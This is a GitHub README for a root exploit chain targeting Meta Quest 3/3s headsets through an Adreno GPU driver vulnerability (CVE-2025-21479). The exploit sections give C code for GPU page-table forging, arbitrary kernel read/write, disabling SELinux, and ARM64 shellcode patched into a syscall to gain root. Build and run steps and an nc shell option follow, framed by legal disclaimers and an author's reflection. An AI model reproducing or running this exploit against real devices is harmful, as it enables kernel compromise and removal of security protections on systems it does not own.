# Please read the following before running anything in this repository!!!
❗**DISCLAIMER**: This is a re-implementation of critical vulnerability logged in Common Vulnerabilities and Exposures [CVE-2025-21479](https://nvd.nist.gov/vuln/detail/CVE-2025-21479) that Meta's security team failed to act up upon enabling us to perform root elevation in a white-hat way. The FreeXR project does not publish undisclosed vulnerabilities and follows ethical guidelines for security disclosures including cooperation with Meta Platform developers to improving the security of their products to manage abuse. Root does not make product abuse possible, it just makes it easier and this exploit affects the Eureka/Panther (Quest 3 and 3s) devices on "Meta Horizon OS" platform ever since it was released to the public. We only bring attention to this issue and publicly log them for further research.

‼️**HUGE DISCLAIMER**: Using root on META Quest 3/3S is very dangerous **SINGLE CHANGE IN THE BOOTLOADER PARTITION WILL RESULT IN A HARD BRICK AND MAKE YOUR DEVICE UNUSABLE!!!** requiring one to unsolder the UFS chip and reprogramming it with external (and expensive) hardware. **Reflashing the device via EDL is impossible** due to Meta refusing to provide the users the cryptographical keys needed to authentificate secure boot on QFPROM implemetation.

⚠️**HUGE WARNING**: DO NOT USE THIS EXPLOIT UNLESS YOU KNOW WHAT YOU ARE DOING!

⚠️**HUGE WARNING**: Pressing the `INSTALL` button in Magisk is going to brick your headset as it will make changes in the bootloader partitions! **Never press that button!!!**

⚠️**HUGE WARNING**: Any change to the /system partition **WILL RESULT IN HARD BRICK!** again due to Meta refusing to provide the users the cryptographical keys.

⚠️**HUGE WARNING**: Make a backup of your `deviceKey`, Meta Access Token and Oculus Access Token to be able to recover from soft brick and nuxskip, preventing 

Feel free to join our community and discuss how to use root safely, we also develop alternative operating system which utilizes root to perform the installation. **NEVER INVOKE COMMANDS YOU ARE NOT 100% SURE WHAT THEY ARE DOING!!!**

 ❗⚠️ **WE ARE NOT RESPONSIBLE FOR ANYTHING THAT HAPPENS TO YOUR DEVICE. BY DOWNLOADING, COMPILING, OR RUNNING THIS CODE, YOU AGREE THAT**
 - **YOU WILL ONLY USES IT ON DEVICES YOU OWN OR HAVE EXPLICIT PERMISSION TO USE ON**
 - **YOU ACKNOWLEDGE THAT USING EXPLOITS MAY BE ILLEGAL IN YOUR JURISDICTIONN**
 - **RUNNING THIS SOFTWARE MAY VOID YOUR DEVICE'S WARRANTY, CAUSE PERMANENT DAMAGE, OR RESULT IN DATA LOSS**
 - **THE AUTHORS AND CONTRIBUTORS ARE NOT LIABLE FOR ANY DAMAGES, WARRANTY VOIDING, DEVICE MALFUNCTION, OR LEGAL CONSEQUENCES**
-  **THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED**
  
 # ❗⚠️IF YOU DO NOT AGREE TO THE ABOVE TEMRS, DO NOT USE OR DISTRIBUTE THIS SOFTWARE

 now lets get to the fun stuff :)

---

# eureka_panther-adreno-gpu-exploit-1
Our first exploit: a memory corruption vulnerability in the Adreno GPU driver for Eureka/Panther (3/3s) devices, enabling arbitrary kernel memory read/write and privilege escalation.

# Make sure to disable OTA updates via:
```sh
adb shell pm disable-user --user 0 com.oculus.updater
```



# Quest 3/3s Adreno GPU Root Exploit

## Overview

This repository contains a full exploit chain for Meta Quest 3/3s devices (codenames: eureka/panther) leveraging a memory corruption vulnerability in the Adreno GPU driver (`/dev/kgsl-3d0`). The exploit achieves arbitrary kernel memory read/write, disables SELinux, and escalates privileges to root. It also includes a kernel dumper and kallsyms symbol resolver.
# 

---

## Table of Contents

- [How the Exploit Works](#how-the-exploit-works)
  - [1. KGSL GPU Driver Primitives](#1-kgsl-gpu-driver-primitives)
  - [2. Page Table Manipulation](#2-page-table-manipulation)
  - [3. Arbitrary Kernel Read/Write](#3-arbitrary-kernel-readwrite)
  - [4. Kernel Dump and Symbol Resolution](#4-kernel-dump-and-symbol-resolution)
  - [5. Disabling SELinux and Gaining Root](#5-disabling-selinux-and-gaining-root)
- [Usage](#usage)
- [References](#references)

---

## How the Exploit Works

### 1. KGSL GPU Driver Primitives

The exploit interacts with the Adreno GPU via the `/dev/kgsl-3d0` device node, using a set of IOCTLs to:

- Create and destroy GPU contexts
- Map user memory into the GPU address space
- Submit crafted GPU command buffers

#### Context Creation

```c
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret) return ret;
    *ctx_id = req.drawctxt_id;
    return 0;
}
```

#### Memory Mapping

```c
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
        .len = len,
        .offset = 0,
        .hostptr = addr,
        .memtype = KGSL_USER_MEM_TYPE_ADDR,
    };
    int ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret) return ret;
    *gpuaddr = req.gpuaddr;
    return 0;
}
```

#### Command Submission

The exploit crafts command buffers that the GPU will execute, allowing it to manipulate memory mappings and perform reads/writes to arbitrary physical addresses.

---

### 2. Page Table Manipulation

The core of the exploit is the ability to create fake GPU page tables that map arbitrary physical addresses into the GPU's address space. This is achieved by allocating large buffers and filling them with crafted page table entries.

#### Page Table Setup

```c
int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    for (int i = 0; i < pages; i++) {
        uint64_t *level_base = (uint64_t *)(tt0 + (i * PAGE_SIZE));
        memset(level_base, 0x45, 4096);
        // Calculate indices for each page table level
        uint64_t level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        uint64_t level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        uint64_t level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;
        // Set up entries to point to the target physical address
        level_base[level1_index] = (uint64_t)tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t)tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t)(target_pa | ENTRY_VALID | ENTRY_RW | ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF | ENTRY_NG);
        // ...additional entries for stability
    }
    return 0;
}
```

By mapping the target physical address into the GPU's address space, the exploit can later instruct the GPU to read or write to that address.

---

### 3. Arbitrary Kernel Read/Write

With the page tables in place, the exploit submits GPU command buffers that perform memory operations on the mapped physical addresses.

#### Example: Arbitrary Read

```c
DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100,
        /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL);
```

#### Example: Arbitrary Write

```c
DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100,
        /*write=*/true, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value);
```

The `DoWrite` function crafts a command buffer that either copies data from the target address (read) or writes data to it (write), using GPU instructions like `CP_MEM_WRITE` and `CP_MEM_TO_MEM`.

---

### 4. Kernel Dump and Symbol Resolution

Once arbitrary read is achieved, the exploit maps the kernel's physical memory and copies it into user space. This allows for:

- Dumping the kernel image for analysis
- Locating important kernel symbols (e.g., `selinux_state`, `init_cred`, `commit_creds`) using kallsyms parsing

#### Kernel Dump

```c
void* kernel_copy_buf = malloc(kernel_size);
memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
fwrite(kernel_copy_buf, 1, kernel_size, f);
fclose(f);
```

#### Kallsyms Lookup

The included `kallsyms_lookup.c` parses the in-memory kernel image to resolve symbol addresses:

```c
struct exploit_kallsyms_lookup kallsyms_lookup;
exploit_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size);
uint64_t selinux_state_addr = exploit_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
```

---

### 5. Disabling SELinux and Gaining Root

With symbol addresses resolved, the exploit disables SELinux and escalates privileges by patching kernel memory.

#### Disabling SELinux

```c
bool* kernel_selinux_state_enforcing_ptr = (bool*)(kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base));
*kernel_selinux_state_enforcing_ptr = false;
__builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + sizeof(bool));
```

#### Privilege Escalation

The exploit patches the kernel's `__do_sys_capset` syscall handler with shellcode that calls `commit_creds(init_cred)`, then invokes the syscall from user space to gain root.

```c
uint32_t shellcode[] = {
    0x58000040, // ldr x0, .+8
    0x14000003, // b   .+12
    LO_DWORD(init_cred_addr),
    HI_DWORD(init_cred_addr),
    0x58000041, // ldr x1, .+8
    0x14000003, // b   .+12
    LO_DWORD(commit_creds_addr),
    HI_DWORD(commit_creds_addr),
    0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
    0xD63F0020, // blr x1
    0xA8C17BFD, // ldp x29, x30, [sp], #0x10
    0x2A1F03E0, // mov w0, wzr
    0xD65F03C0, // ret
};
```

Patch and trigger:

```c
stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
__builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(shellcode));
capset(NULL, NULL); // Triggers shellcode, sets UID=0
```

Restore the original syscall handler after use.

---

## Usage

**Requirements:**
- Meta Quest 3/3s device (eureka/panther)
- `adb` shell
- Compiled exploit binary

**Build:**
```sh
aarch64-linux-android34-clang -o cheese cheese.c
```
with the Android NDK [here](https://developer.android.com/ndk).

**Run:**

Push to device:
```sh
adb push exploit /data/local/tmp
```
Run IN an `adb shell` for best results:
```sh
adb shell
chmod +x /data/local/tmp/exploit/exploit
/data/local/tmp/exploit/exploit
```

**Options:**
- Choose to disable SELinux, gain root, or both.
- Optionally dump the kernel image.
- Optionally launch a shell with toybox nc (`localhost:1234`)

---

## References

- [cheese (Original POC)](https://github.com/zhuowei/cheese/tree/main)
- [Adrenaline by Hawkes](https://project-zero.issues.chromium.org/issues/42451155)
- [FreeXR Community](https://discord.gg/ABCXxDyqrH)
- XRBreak Community
  
Thanks to everyone who helped with the development of the exploit! You all rock!!! -cats

## reflection -cats
Thank you, everyone.

The FreeXR project began with something small - an issue I created on the [QuestEscape repository](https://github.com/QuestEscape/research/issues/3). All I wanted was to use my Quest 3 as a Minecraft server for an upcoming LAN party with my friends and turn off the display to keep temperatures down - requiring root. At the time, my “arsenal” was just a MacBook Air M3 (16/256) and my school potato (i5-1135G7/8/256). On February 26th, I started the “Quest 3 Exploits” server.

Six months ago, I never could have imagined we’d be here today.

Now, half a year later, we’ve grown into a thriving community just shy of 1,000 members - developers, hardware hackers, everyday VR users (and cats!!), and we’ve developed a working root exploit for all Quest 3 and 3s devices (as of this writing).

In the process, I’ve been on a wild journey of learning and growth. The Quest 3 was my first Android device. I dove deeper into C while building the exploit. I’ve navigated the ups and downs of countless conversations in the server - from lighthearted jokes to heated debates, Mandi crashing out so hard in #remote-access-shell, Noah and I having massive headaches writing [the FreeXR Discord Bot](https://github.com/FreeXR/FreeXR-Bot) - and yes, [even trolled Reddit](https://www.reddit.com/r/OculusQuest/comments/1ma7a1o/plugged_in_my_dead_quest_3_and_rainbow_leds/)...

Every challenge, every small victory, every connection I’ve made here has shaped me. I’ve met so many wonderful people, and each of you - whether you’ve stayed or moved on - has been part of this journey.

As an Australian teenager who had just stepped into the VR world when I opened that first GitHub issue, I never expected things to take off like this. But here we are - and I couldn’t be happier or prouder of what we’ve built together.

Thank you all. Here’s to whatever amazing things come next.

<sup><sub>p.s. i never got a minecraft license, saving up for a Wooting 80HE 😤😤😤</sup></sub>
